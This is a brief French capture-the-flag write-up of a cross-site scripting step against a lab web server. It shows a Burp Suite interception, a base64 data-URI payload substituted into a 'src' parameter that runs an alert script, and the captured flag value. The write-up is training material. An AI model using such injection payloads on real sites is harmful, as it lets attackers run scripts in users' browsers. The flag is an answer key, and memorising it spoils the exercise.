Flag 10 - XSS


On active Burp Proxy :

BurpSuite -> Proxy -> Intercept ON

Depuis un navigateur on entre :

http://192.168.1.47/?page=media&src=nsa


On intercepte la requête :

<img width="980" height="612" alt="image" src="https://github.com/user-attachments/assets/5b14928f-9315-4cb1-bd44-7c6cc99c0330" />


On remplace src=nsa par src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=


On forward la requête. Le navigateur reçoit alors une page contenant le JavaScript, et il s'execute automatiquement.

Une page s'affiche automatiquement avec :


THE FLAG IS :
928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D



<img width="980" height="612" alt="image" src="https://github.com/user-attachments/assets/36f43000-5f03-4164-9421-b616e7f250bd" />
